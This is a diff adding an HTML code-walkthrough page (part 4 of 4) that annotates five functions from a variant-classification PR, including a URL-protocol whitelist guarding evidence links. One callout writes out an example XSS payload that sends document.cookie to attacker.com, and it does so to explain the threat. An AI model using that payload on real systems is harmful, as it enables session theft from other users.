@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PR D3 — Classification Components · Part 4: Line-by-line reference</title>
+<style>
+  :root{
+    --ink:#0d1b2a;--ink-soft:#354656;--muted:#6b7c8d;
+    --line:#e0e7ef;--line-strong:#c5d0db;
+    --bg:#f7f9fb;--paper:#ffffff;
+    --accent:#005eb8;--accent-deep:#003d78;--accent-mid:#1a73c4;--accent-soft:#e3edf8;
+    --green:#1a6e47;--green-soft:#e0f0e8;
+    --amber:#b35c00;--amber-soft:#fdf0e0;
+    --red:#9b2335;--red-soft:#fce8ea;
+    --purple:#4b2d8e;--purple-soft:#ede8f8;
+    --shadow:0 1px 3px rgba(13,27,42,.05),0 4px 20px rgba(13,27,42,.08);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--ink);
+    font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI","Inter",Roboto,Helvetica,Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;}
+  a{color:var(--accent-mid);text-decoration:none}
+  a:hover{text-decoration:underline}
+  .layout{display:grid;grid-template-columns:270px minmax(0,1fr);max-width:1320px;margin:0 auto}
+  @media(max-width:860px){.layout{grid-template-columns:1fr}.toc{display:none}}
+  main{padding:0 56px 96px;max-width:900px}
+  @media(max-width:860px){main{padding:0 24px 64px}}
+  h1{font-size:38px;line-height:1.1;letter-spacing:-.015em;font-weight:800;color:var(--ink);margin-bottom:14px;max-width:22ch}
+  h2{font-size:24px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+  h2 .sec-num{font-size:12px;letter-spacing:.06em;text-transform:uppercase;background:var(--accent);color:#fff;padding:3px 9px;border-radius:999px;font-weight:700;white-space:nowrap}
+  h3{font-size:17px;font-weight:700;margin:28px 0 10px;color:var(--ink)}
+  h4{font-size:13px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);margin:20px 0 8px;font-weight:600}
+  p{margin-bottom:13px;color:var(--ink-soft)}
+  strong{color:var(--ink)}
+  ul,ol{margin:0 0 14px;padding-left:22px}
+  li{margin:5px 0;color:var(--ink-soft)}
+  .toc{position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;padding:28px 24px;background:var(--paper);border-right:1px solid var(--line);font-size:13px}
+  .toc-brand{font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--accent-deep);margin-bottom:20px;line-height:1.4}
+  .toc-section{font-size:11px;font-weight:600;letter-spacing:.07em;text-transform:uppercase;color:var(--muted);margin:18px 0 6px}
+  .toc ul{list-style:none}
+  .toc ul li a{display:block;padding:5px 0 5px 16px;color:var(--ink-soft);border-left:2px solid transparent;transition:all .15s;font-size:12.5px;line-height:1.4}
+  .toc ul li a:hover{color:var(--accent);border-left-color:var(--accent);text-decoration:none;padding-left:20px}
+  .toc .meta{margin-top:22px;padding-top:18px;border-top:1px solid var(--line);font-size:11.5px;color:var(--muted);line-height:1.6}
+  .hero{padding:52px 0 36px;border-bottom:1px solid var(--line);margin-bottom:8px}
+  .hero .eyebrow{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);font-weight:700;margin-bottom:12px}
+  .hero h1{font-size:38px;line-height:1.1;letter-spacing:-.015em;font-weight:800;color:var(--ink);margin-bottom:14px;max-width:22ch}
+  .hero .sub{font-size:17px;line-height:1.55;color:var(--ink-soft);max-width:64ch}
+  .hero .meta-row{display:flex;gap:24px;margin-top:20px;flex-wrap:wrap}
+  .hero .meta-item{font-size:12px;color:var(--muted)}
+  .hero .meta-item strong{color:var(--ink-soft)}
+  section{padding-top:52px}
+  section+section{border-top:1px solid var(--line)}
+  footer{padding:32px 56px;color:var(--muted);font-size:12px;border-top:1px solid var(--line);max-width:1320px;margin:0 auto;line-height:1.7}
+  .callout{border-radius:6px;padding:18px 22px;margin:18px 0;border:1px solid}
+  .callout.blue{border-color:#b3cce8;background:var(--accent-soft)}
+  .callout.green{border-color:#a8d4bb;background:var(--green-soft)}
+  .callout.amber{border-color:#e8c28a;background:var(--amber-soft)}
+  .callout.red{border-color:#e8b3b3;background:var(--red-soft)}
+  .callout .tag{display:block;font-size:11px;letter-spacing:.08em;text-transform:uppercase;font-weight:700;margin-bottom:6px}
+  .callout.blue .tag{color:var(--accent-deep)}
+  .callout.green .tag{color:var(--green)}
+  .callout.amber .tag{color:var(--amber)}
+  .callout.red .tag{color:var(--red)}
+  .callout p:last-child{margin:0}
+  .series-nav{display:flex;gap:8px;flex-wrap:wrap;margin:18px 0}
+  .series-nav a{display:inline-block;padding:6px 14px;border-radius:6px;font-size:12.5px;font-weight:600;border:1px solid var(--line);background:var(--paper);color:var(--ink-soft)}
+  .series-nav a.current{background:var(--accent-deep);color:#fff;border-color:var(--accent-deep)}
+  .series-nav a:hover{border-color:var(--accent);color:var(--accent);text-decoration:none}
+  code{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;background:#f0f4f8;padding:2px 6px;border-radius:3px;color:var(--accent-deep)}
+  /* ACB component */
+  .acb{margin:20px 0 32px;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+  .acb-header{background:var(--accent-deep);padding:10px 16px;display:flex;gap:16px;align-items:baseline;flex-wrap:wrap}
+  .acb-fn{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;color:#fff;font-weight:700}
+  .acb-desc{font-size:12px;color:#a8c8e8}
+  .acb-code{background:#1e2d3d;overflow-x:auto}
+  .acb-code pre{color:#cdd9e5;font:12.5px/1.9 ui-monospace,Menlo,Consolas,monospace;margin:0;padding:16px 20px;white-space:pre}
+  .acb-code .c{color:#6e9cbf}.acb-code .k{color:#79b8ff}.acb-code .s{color:#9ecbff}
+  .acb-code .n{color:#b392f0}.acb-code .f{color:#85e89d}.acb-code .t{color:#ffab70}
+  .acb-code .mk{color:#ffcc00;font-weight:700}
+  .acb-annos{border-top:2px solid #2d4a63}
+  .anno-row{display:grid;grid-template-columns:44px 1fr;border-bottom:1px solid var(--line)}
+  .anno-row:last-child{border-bottom:none}
+  .anno-num{background:#f0f4f8;border-right:1px solid var(--line);display:flex;align-items:flex-start;justify-content:center;padding:12px 0;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;font-weight:700;color:var(--accent-deep);padding-top:14px}
+  .anno-txt{padding:12px 16px;font-size:13.5px;color:var(--ink-soft);line-height:1.55}
+  .anno-txt strong{color:var(--ink)}
+  .anno-txt code{font-size:12.5px}
+  .pill{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11px;font-weight:600;letter-spacing:.04em}
+  .pill.red{background:var(--red-soft);color:var(--red)}
+  .pill.blue{background:var(--accent-soft);color:var(--accent-deep)}
+  .pill.green{background:var(--green-soft);color:var(--green)}
+</style>
+</head>
+<body>
+<div class="layout">
+
+<aside class="toc">
+  <div class="toc-brand">PERSONAL BRIEFING — PR D3: CLASSIFICATION COMPONENTS<br>21 May 2026</div>
+  <div class="toc-section">Part 4 · Line-by-line</div>
+  <ul>
+    <li><a href="#acb-valid">isValidEvidenceLink</a></li>
+    <li><a href="#acb-init">initCriteriaState</a></li>
+    <li><a href="#acb-update">updateCriterion</a></li>
+    <li><a href="#acb-save">save()</a></li>
+    <li><a href="#acb-reset">handleReset()</a></li>
+  </ul>
+  <div class="meta">Part 4 of 4 · Dense annotations for the 5 hardest functions</div>
+</aside>
+
+<main>
+<header class="hero">
+  <div class="eyebrow">Frontend code walkthrough · variant-viewer PR D3</div>
+  <h1>Line-by-line reference — Part 4 of 4</h1>
+  <p class="sub">Dense annotations for the five functions where understanding <em>why</em> each line is written the way it is matters most: the security guard, the initialiser, the stable callback, and the two async save flows.</p>
+  <div class="meta-row">
+    <span class="meta-item"><strong>Author</strong> Joo Wook Ahn</span>
+    <span class="meta-item"><strong>Date</strong> 21 May 2026</span>
+    <span class="meta-item"><strong>Part</strong> 4 of 4 — Line-by-line reference</span>
+  </div>
+</header>
+
+<div class="series-nav">
+  <a href="260521_PR_D3_Classification_Components_1.html">1 · High-level outline</a>
+  <a href="260521_PR_D3_Classification_Components_2.html">2 · Key concepts</a>
+  <a href="260521_PR_D3_Classification_Components_3.html">3 · Function walkthrough</a>
+  <a href="260521_PR_D3_Classification_Components_4.html" class="current">4 · Line-by-line reference</a>
+</div>
+
+<!-- ── SECTION 18 ─────────────────────────────────────────── -->
+<section id="acb-valid">
+  <h2><span class="sec-num">18</span> isValidEvidenceLink</h2>
+  <p>The security cornerstone of this PR. Every evidence link — whether typed by a user or loaded from the server — passes through this function before reaching the DOM.</p>
+
+  <div class="acb">
+    <div class="acb-header">
+      <span class="acb-fn">isValidEvidenceLink</span>
+      <span class="acb-desc">CriterionRow.tsx · lines 4–10 · Invariant 3 enforcement</span>
+    </div>
+    <div class="acb-code"><pre><span class="k">export function</span> <span class="f">isValidEvidenceLink</span>(url: <span class="t">string</span>): <span class="t">boolean</span> {
+  <span class="k">try</span> {
+    <span class="k">const</span> parsed = <span class="k">new</span> <span class="t">URL</span>(url.<span class="f">trim</span>());  <span class="mk">// ①</span>
+    <span class="k">return</span> parsed.protocol === <span class="s">"http:"</span>    <span class="mk">// ②</span>
+        || parsed.protocol === <span class="s">"https:"</span>;  <span class="mk">// ③</span>
+  } <span class="k">catch</span> {                               <span class="mk">// ④</span>
+    <span class="k">return</span> <span class="k">false</span>;                        <span class="mk">// ⑤</span>
+  }
+}</pre></div>
+    <div class="acb-annos">
+      <div class="anno-row"><div class="anno-num">①</div><div class="anno-txt"><strong><code>new URL(url.trim())</code></strong> — The browser's WHATWG-compliant URL parser. <code>trim()</code> strips accidental leading/trailing whitespace before parsing. The constructor throws a <code>TypeError</code> for any input that cannot be parsed as a URL — this is the failure path for relative URLs, bare words, and malformed strings. Importantly, it does NOT throw for <code>javascript:alert(1)</code> — that parses cleanly with protocol <code>"javascript:"</code>.</div></div>
+      <div class="anno-row"><div class="anno-num">②</div><div class="anno-txt"><strong><code>parsed.protocol === "http:"</code></strong> — Note the colon: the WHATWG URL standard includes the trailing colon in the protocol property. <code>new URL("http://x.com").protocol</code> returns <code>"http:"</code>, not <code>"http"</code>. This comparison works correctly because of that.</div></div>
+      <div class="anno-row"><div class="anno-num">③</div><div class="anno-txt"><strong>Strict whitelist, not a blacklist.</strong> Only <code>"http:"</code> and <code>"https:"</code> are allowed. Everything else — <code>"javascript:"</code>, <code>"data:"</code>, <code>"ftp:"</code>, <code>"blob:"</code>, <code>"file:"</code>, custom schemes — returns false. A blacklist approach ("block javascript:") would need constant maintenance as new dangerous schemes are discovered.</div></div>
+      <div class="anno-row"><div class="anno-num">④</div><div class="anno-txt"><strong>The catch block has no binding</strong> (<code>catch {</code> not <code>catch (e) {</code>). This is ES2019+ syntax — perfectly valid TypeScript. We deliberately ignore the error value since the only thing we need to know is that parsing failed, and we always return the same thing regardless of <em>why</em> it failed.</div></div>
+      <div class="anno-row"><div class="anno-num">⑤</div><div class="anno-txt"><strong><code>return false</code></strong> — Any input that the URL constructor cannot parse (relative URLs like <code>"../evil"</code>, empty strings, plain text like <code>"just notes"</code>) reaches here and is rejected. The user will see the inline <code>linkError</code> message and the link will not be added to state.</div></div>
+    </div>
+  </div>
+
+  <div class="callout red">
+    <span class="tag">What this prevents</span>
+    <p>Without this guard, a user could type <code>javascript:fetch('https://attacker.com?c='+document.cookie)</code> as an evidence link. When the saved classification is loaded by another analyst, the link would appear as a clickable anchor tag. One click executes the JavaScript in the victim's browser session, exfiltrating their session cookies or API key. The <code>isValidEvidenceLink</code> check prevents this link from ever reaching the <code>href</code> attribute at all.</p>
+  </div>
+</section>
+
+<!-- ── SECTION 19 ─────────────────────────────────────────── -->
+<section id="acb-init">
+  <h2><span class="sec-num">19</span> initCriteriaState</h2>
+  <p>Called on mount (with server data), on framework switch (with empty existing), and on reset (with empty existing). The evidence link re-validation in this function is the second enforcement point for Invariant 3.</p>
+
+  <div class="acb">
+    <div class="acb-header">
+      <span class="acb-fn">initCriteriaState</span>
+      <span class="acb-desc">ClassificationPanel.tsx · lines ~39–60 · Init + Security</span>
+    </div>
+    <div class="acb-code"><pre><span class="k">function</span> <span class="f">initCriteriaState</span>(
+  defs: <span class="t">CriterionDef</span>[],
+  existing: <span class="t">Partial</span>&lt;<span class="t">CriterionDetail</span>&gt;[]
+): <span class="t">CriterionState</span>[] {
+  <span class="k">return</span> defs.<span class="f">map</span>((def) =&gt; {
+    <span class="k">const</span> e = existing.<span class="f">find</span>(          <span class="mk">// ①</span>
+      (c) =&gt; c.criterion_code === def.code
+    );
+    <span class="k">const</span> rawLinks = e?.evidence_links ?? [];  <span class="mk">// ②</span>
+    <span class="k">const</span> safeLinks = rawLinks.<span class="f">filter</span>(          <span class="mk">// ③</span>
+      isValidEvidenceLink
+    );
+    <span class="k">return</span> {                                    <span class="mk">// ④</span>
+      criterion_code: def.code,
+      applied: e?.applied ?? <span class="k">false</span>,             <span class="mk">// ⑤</span>
+      strength: e?.strength ?? def.default_strength, <span class="mk">// ⑥</span>
+      notes: e?.notes ?? <span class="s">""</span>,
+      evidence_links: safeLinks,                 <span class="mk">// ⑦</span>
+      pre_computed: e?.pre_computed ?? <span class="k">false</span>,
+      pre_computed_value: e?.pre_computed_value ?? <span class="k">null</span>,
+    };
+  });
+}</pre></div>
+    <div class="acb-annos">
+      <div class="anno-row"><div class="anno-num">①</div><div class="anno-txt"><strong><code>existing.find(c =&gt; c.criterion_code === def.code)</code></strong> — Linear search through the existing criteria array for a matching code. This is O(n²) in the worst case (28 defs × 28 existing entries = 784 comparisons), but with a maximum of 28 criteria this is negligible. The code is clearer than a pre-built Map for this scale.</div></div>
+      <div class="anno-row"><div class="anno-num">②</div><div class="anno-txt"><strong><code>e?.evidence_links ?? []</code></strong> — Optional chaining (<code>e?.</code>) safely returns <code>undefined</code> if <code>e</code> is undefined (no existing entry for this criterion). The <code>?? []</code> nullish coalescing then provides an empty array default. This handles both "new classification" (e is undefined) and "existing classification where links were not saved" (e.evidence_links is null/undefined).</div></div>
+      <div class="anno-row"><div class="anno-num">③</div><div class="anno-txt"><strong><code>rawLinks.filter(isValidEvidenceLink)</code></strong> — Re-validates every link from the server. Passing the function directly as a callback (rather than wrapping in an arrow function) is slightly more efficient and cleaner to read. Any link that fails the protocol check is silently dropped — this is the right behaviour because the alternative (throwing an error) would break loading of an otherwise valid classification. The comment in the source explains the threat model: "a valid API key holder could inject javascript: URLs via API".</div></div>
+      <div class="anno-row"><div class="anno-num">④</div><div class="anno-txt"><strong>The return object is constructed fresh every call.</strong> This is important for the reset path — <code>initCriteriaState(defs, [])</code> creates 28 new objects with all defaults. Because React's state update is a reference comparison, new objects will always trigger a re-render, ensuring the reset is visible. If the function returned the same object references, React might bail out thinking nothing changed.</div></div>
+      <div class="anno-row"><div class="anno-num">⑤</div><div class="anno-txt"><strong><code>e?.applied ?? false</code></strong> — Defaults to <code>false</code> (unapplied) when there is no existing entry or when <code>applied</code> is null/undefined. Note: <code>?? false</code> is correct here (not <code>|| false</code>) because <code>false</code> itself must be preserved — if <code>e.applied</code> is explicitly <code>false</code>, we want to keep it false, not fall through to the default.</div></div>
+      <div class="anno-row"><div class="anno-num">⑥</div><div class="anno-txt"><strong><code>e?.strength ?? def.default_strength</code></strong> — When loading a saved classification the stored strength is used. When initialising fresh (or resetting), the criterion's own <code>default_strength</code> from the JSON config is used. This ensures a fresh panel always starts with the ACGS-specified default strength for each criterion.</div></div>
+      <div class="anno-row"><div class="anno-num">⑦</div><div class="anno-txt"><strong><code>evidence_links: safeLinks</code></strong> — Uses the filtered array, not the raw array. This is the output of the security step at ③. Any <code>javascript:</code> or <code>data:</code> URLs that somehow made it into the database are dropped here, before they enter React state, and therefore before they could ever be rendered as <code>href</code> attributes.</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ── SECTION 20 ─────────────────────────────────────────── -->
+<section id="acb-update">
+  <h2><span class="sec-num">20</span> updateCriterion</h2>
+  <p>The callback passed to every CriterionRow. Its <code>useCallback([], [])</code> wrapping is the reason ClassificationPanel can render 28 CriterionRow components without cascade re-renders.</p>
+
+  <div class="acb">
+    <div class="acb-header">
+      <span class="acb-fn">updateCriterion</span>
+      <span class="acb-desc">ClassificationPanel.tsx · ~lines 115–126 · useCallback</span>
+    </div>
+    <div class="acb-code"><pre><span class="k">const</span> updateCriterion = <span class="f">useCallback</span>(     <span class="mk">// ①</span>
+  (code: <span class="t">string</span>, updates: <span class="t">Partial</span>&lt;<span class="t">CriterionState</span>&gt;) =&gt; {
+    <span class="f">setCriteria</span>((prev) =&gt;               <span class="mk">// ②</span>
+      prev.<span class="f">map</span>((c) =&gt;
+        c.criterion_code === code
+          ? { ...c, ...updates }         <span class="mk">// ③</span>
+          : c
+      )
+    );
+    <span class="k">if</span> (<span class="s">"applied"</span> <span class="k">in</span> updates)           <span class="mk">// ④</span>
+      <span class="f">setFrameworkLocked</span>(<span class="k">true</span>);
+  },
+  []                                     <span class="mk">// ⑤</span>
+);</pre></div>
+    <div class="acb-annos">
+      <div class="anno-row"><div class="anno-num">①</div><div class="anno-txt"><strong><code>useCallback(..., [])</code></strong> — Creates the function once and never recreates it. This is safe because the function does not use any component-scoped variables directly — it only calls <code>setCriteria</code> and <code>setFrameworkLocked</code>, which are stable state setter references provided by React.</div></div>
+      <div class="anno-row"><div class="anno-num">②</div><div class="anno-txt"><strong>Functional update form: <code>setCriteria((prev) =&gt; ...)</code></strong> — Critical. Because <code>updateCriterion</code> is created once with empty deps, it does not have access to the current <code>criteria</code> state in its closure. If it did <code>setCriteria([...criteria.map(...)])</code>, it would use the stale 28-element array from mount time. The functional form <code>prev =&gt;</code> receives the current state at call time from React's scheduler, bypassing the stale closure entirely.</div></div>
+      <div class="anno-row"><div class="anno-num">③</div><div class="anno-txt"><strong><code>{ ...c, ...updates }</code></strong> — Spread merge: creates a new object with all of <code>c</code>'s properties, then overrides any that appear in <code>updates</code>. This is a shallow merge, which is correct here because CriterionState's <code>evidence_links</code> array is replaced wholesale (not mutated), and the other fields are all primitives.</div></div>
+      <div class="anno-row"><div class="anno-num">④</div><div class="anno-txt"><strong><code>"applied" in updates</code></strong> — The <code>in</code> operator checks whether the key exists in the object, not whether its value is truthy. This fires for both <code>onChange({applied: true})</code> and <code>onChange({applied: false})</code>. The framework should lock on the first <em>interaction</em> with any checkbox — regardless of direction. If this were <code>updates.applied === true</code>, checking then unchecking a criterion would leave the framework unlocked.</div></div>
+      <div class="anno-row"><div class="anno-num">⑤</div><div class="anno-txt"><strong>Empty dependency array.</strong> No re-creation ever. The contract this creates: callers can safely pass this to CriterionRow's <code>onChange</code> prop knowing it will never change reference, so React's prop equality check for CriterionRow will always pass (no false re-renders from a new callback object each render).</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ── SECTION 21 ─────────────────────────────────────────── -->
+<section id="acb-save">
+  <h2><span class="sec-num">21</span> save()</h2>
+  <p>The single function handling both draft and confirmed saves. The entire draft/confirm distinction reduces to one ternary on <code>locked_by</code>.</p>
+
+  <div class="acb">
+    <div class="acb-header">
+      <span class="acb-fn">save</span>
+      <span class="acb-desc">ClassificationPanel.tsx · ~lines 130–150 · async API call</span>
+    </div>
+    <div class="acb-code"><pre><span class="k">async function</span> <span class="f">save</span>(lock: <span class="t">boolean</span>) {
+  <span class="f">setSaving</span>(<span class="k">true</span>);                             <span class="mk">// ①</span>
+  <span class="f">setSaveError</span>(<span class="k">null</span>);
+  <span class="k">try</span> {
+    <span class="k">const</span> result = <span class="k">await</span> <span class="f">putClassification</span>(variantId, {
+      framework,
+      user_id: userId,
+      locked_by: lock ? userId : <span class="k">null</span>,         <span class="mk">// ②</span>
+      criteria: criteria.<span class="f">map</span>((c) =&gt; ({
+        criterion_code: c.criterion_code,
+        applied: c.applied,
+        strength: c.strength,
+        notes: c.notes || <span class="k">undefined</span>,           <span class="mk">// ③</span>
+        evidence_links: c.evidence_links.length &gt; <span class="n">0</span>
+          ? c.evidence_links
+          : <span class="k">undefined</span>,                          <span class="mk">// ④</span>
+      })),
+    });
+    <span class="f">setClassId</span>(result.classification_id);      <span class="mk">// ⑤</span>
+    <span class="k">if</span> (lock) <span class="f">setLockedAt</span>(<span class="k">new</span> <span class="t">Date</span>().<span class="f">toISOString</span>()); <span class="mk">// ⑥</span>
+  } <span class="k">catch</span> (err) {
+    <span class="f">setSaveError</span>(                               <span class="mk">// ⑦</span>
+      err <span class="k">instanceof</span> <span class="t">Error</span> ? err.message : <span class="s">"Save failed"</span>
+    );
+  } <span class="k">finally</span> {
+    <span class="f">setSaving</span>(<span class="k">false</span>);                          <span class="mk">// ⑧</span>
+  }
+}</pre></div>
+    <div class="acb-annos">
+      <div class="anno-row"><div class="anno-num">①</div><div class="anno-txt"><strong><code>setSaving(true)</code> first, <code>setSaveError(null)</code> second.</strong> This order matters. Setting <code>saving</code> first disables the Save/Confirm buttons in the next render, preventing double-submission. Clearing <code>saveError</code> removes any previous error banner — the user should not see stale errors while a new attempt is in flight.</div></div>
+      <div class="anno-row"><div class="anno-num">②</div><div class="anno-txt"><strong><code>locked_by: lock ? userId : null</code></strong> — The entire draft/confirm distinction. When <code>null</code>, the backend stores <code>NULL</code> in <code>locked_at</code> (draft). When a non-null string, the backend stores <code>NOW()</code> in <code>locked_at</code> (confirmed). The Pydantic validator on the backend rejects empty strings, so <code>userId</code> must be a non-empty string — it is initialized as <code>import.meta.env.VITE_USER_ID ?? "analyst"</code>.</div></div>
+      <div class="anno-row"><div class="anno-num">③</div><div class="anno-txt"><strong><code>c.notes || undefined</code></strong> — An empty string is falsy in JavaScript, so <code>"" || undefined</code> returns <code>undefined</code>. When serialised to JSON, <code>undefined</code> values in object properties are omitted entirely. This keeps the request payload clean: empty notes fields do not appear in the JSON body at all, matching the API schema where <code>notes</code> is <code>Optional[str]</code>.</div></div>
+      <div class="anno-row"><div class="anno-num">④</div><div class="anno-txt"><strong><code>c.evidence_links.length &gt; 0 ? c.evidence_links : undefined</code></strong> — Same principle: empty arrays are omitted from the JSON body. This is a minor bandwidth optimisation but also ensures the API receives a clean null/absent rather than an empty array for criteria with no links.</div></div>
+      <div class="anno-row"><div class="anno-num">⑤</div><div class="anno-txt"><strong><code>setClassId(result.classification_id)</code></strong> — After the first save (whether draft or confirm), <code>classId</code> is set. Subsequent saves will still call <code>PUT /api/variants/{id}/classification</code>, which soft-deletes the previous record and inserts a new one. The <code>classId</code> is used in <code>handleReset</code> as the ID to pass to the DELETE endpoint. Without this, a reset attempt after a draft save would fail the <code>if (!classId) return</code> guard.</div></div>
+      <div class="anno-row"><div class="anno-num">⑥</div><div class="anno-txt"><strong><code>setLockedAt(new Date().toISOString())</code> — only on confirm.</strong> This is the client clock, not the server's <code>locked_at</code> value. It is used only for the "Confirmed DD/MM/YYYY" display label. The server's actual timestamp (stored in the DB) is the authoritative value for audit purposes. Using the client clock here avoids a round-trip to fetch the server timestamp after a successful save.</div></div>
+      <div class="anno-row"><div class="anno-num">⑦</div><div class="anno-txt"><strong><code>err instanceof Error ? err.message : "Save failed"</code></strong> — This works correctly because the test mock uses the real <code>ApiError</code> class (which extends <code>Error</code>) via the partial mock factory. For a network error, the browser's <code>fetch()</code> throws a real <code>TypeError</code> (extends Error). The fallback string handles the pathological case where something throws a non-Error (e.g. a string).</div></div>
+      <div class="anno-row"><div class="anno-num">⑧</div><div class="anno-txt"><strong><code>setSaving(false)</code> in <code>finally</code>.</strong> The <code>finally</code> block runs regardless of success or failure. Without it, a failed save would leave <code>saving: true</code> permanently, disabling the buttons and making the panel unusable. The state update in <code>finally</code> always runs, even if the catch block itself throws.</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ── SECTION 22 ─────────────────────────────────────────── -->
+<section id="acb-reset">
+  <h2><span class="sec-num">22</span> handleReset()</h2>
+  <p>The most complex async flow in this PR — it must carefully distinguish between "success: wipe all state" and "failure: close the confirm dialog but leave everything else intact".</p>
+
+  <div class="acb">
+    <div class="acb-header">
+      <span class="acb-fn">handleReset</span>
+      <span class="acb-desc">ClassificationPanel.tsx · ~lines 152–170 · async API call</span>
+    </div>
+    <div class="acb-code"><pre><span class="k">async function</span> <span class="f">handleReset</span>() {
+  <span class="k">if</span> (!classId) <span class="k">return</span>;                    <span class="mk">// ①</span>
+  <span class="f">setSaving</span>(<span class="k">true</span>);
+  <span class="f">setSaveError</span>(<span class="k">null</span>);
+  <span class="k">try</span> {
+    <span class="k">await</span> <span class="f">apiReset</span>(variantId, classId, userId); <span class="mk">// ②</span>
+    <span class="f">setClassId</span>(<span class="k">null</span>);                        <span class="mk">// ③</span>
+    <span class="f">setLockedAt</span>(<span class="k">null</span>);
+    <span class="f">setFrameworkLocked</span>(<span class="k">false</span>);
+    <span class="f">setCriteria</span>(<span class="f">initCriteriaState</span>(defs, []));
+    <span class="f">setShowResetConfirm</span>(<span class="k">false</span>);
+  } <span class="k">catch</span> (err) {
+    <span class="f">setSaveError</span>(                            <span class="mk">// ④</span>
+      err <span class="k">instanceof</span> <span class="t">Error</span> ? err.message : <span class="s">"Reset failed"</span>
+    );
+    <span class="f">setShowResetConfirm</span>(<span class="k">false</span>);             <span class="mk">// ⑤</span>
+  } <span class="k">finally</span> {
+    <span class="f">setSaving</span>(<span class="k">false</span>);
+  }
+}</pre></div>
+    <div class="acb-annos">
+      <div class="anno-row"><div class="anno-num">①</div><div class="anno-txt"><strong><code>if (!classId) return</code></strong> — Guard against calling the reset endpoint with no classification to reset. This should not be reachable in normal use (the Reset button is only rendered when <code>!!lockedAt</code>, and <code>lockedAt</code> is only set after a successful save which also sets <code>classId</code>) — but it's a defensive check against unusual state sequences.</div></div>
+      <div class="anno-row"><div class="anno-num">②</div><div class="anno-txt"><strong><code>apiReset(variantId, classId, userId)</code></strong> — Calls <code>DELETE /api/variants/{variantId}/classification/{classId}</code> with <code>{user_id: userId}</code> body. The backend soft-deletes the existing classification record and inserts a blank replacement (preserving the audit trail). The backend may return 409 if another user deleted the same classification concurrently — this surfaces as an <code>ApiError</code> caught at ④.</div></div>
+      <div class="anno-row"><div class="anno-num">③</div><div class="anno-txt"><strong>Success: five state updates in sequence.</strong> React batches these (React 18 automatic batching) into a single re-render. After batching: <code>classId=null</code> (reset endpoint gets a new blank ID from the backend, but we don't need it here), <code>lockedAt=null</code> (unlocks panel, shows Save/Confirm), <code>frameworkLocked=false</code> (re-enables framework selector), <code>criteria=[blank defaults]</code> (28 fresh CriterionState objects), <code>showResetConfirm=false</code> (hides the confirm row). The result is a completely blank panel.</div></div>
+      <div class="anno-row"><div class="anno-num">④</div><div class="anno-txt"><strong><code>setSaveError</code> in the catch.</strong> The error message from the API (e.g. "Concurrent modification: classification already deleted, please retry") is surfaced in the red banner below the panel header. The panel remains in its locked state — the <code>lockedAt</code> state variable is unchanged, so Save/Confirm remain hidden and the Reset button remains visible.</div></div>
+      <div class="anno-row"><div class="anno-num">⑤</div><div class="anno-txt"><strong><code>setShowResetConfirm(false)</code> in the catch — the deliberate asymmetry.</strong> On success, this is also called. But in the catch, it closes the "Yes reset / Cancel" confirmation row without clearing any other state. If this were NOT called on failure, the analyst would see: error banner visible + "Yes reset / Cancel" row still visible — two calls-to-action at the same time, which is confusing. Closing the confirm row on failure forces the analyst back to the clean "Reset classification" button, where they can retry consciously.</div></div>
+    </div>
+  </div>
+
+  <div class="callout blue">
+    <span class="tag">Backend reset contract</span>
+    <p>The backend's <code>DELETE</code> endpoint does not physically delete the classification row. It soft-deletes it (<code>UPDATE ... SET deleted_at=NOW()</code>) and inserts a new blank row. This preserves the full audit trail — the original classification, score, and criteria remain in the database with a <code>deleted_at</code> timestamp, queryable for audit purposes. The new blank row becomes the "active" classification for the variant. A 409 response means another request (possible concurrent session) soft-deleted the same row between the panel's initial GET and this DELETE — the error message instructs the analyst to retry.</p>
+  </div>
+
+  <div class="series-nav">
+    <a href="260521_PR_D3_Classification_Components_1.html">1 · High-level outline</a>
+    <a href="260521_PR_D3_Classification_Components_2.html">2 · Key concepts</a>
+    <a href="260521_PR_D3_Classification_Components_3.html">3 · Function walkthrough</a>
+    <a href="260521_PR_D3_Classification_Components_4.html" class="current">4 · Line-by-line reference</a>
+  </div>
+</section>
+
+</main>
+</div>
+
+<footer>
+  Continued from Part 3 · Joo Wook Ahn · 21 May 2026 · Source: CriterionRow.tsx, ClassificationPanel.tsx, their tests, backend/app/routes/classification.py, acgs-snv-criteria.json · variant-viewer PR D3
+</footer>
+</body>
+</html>
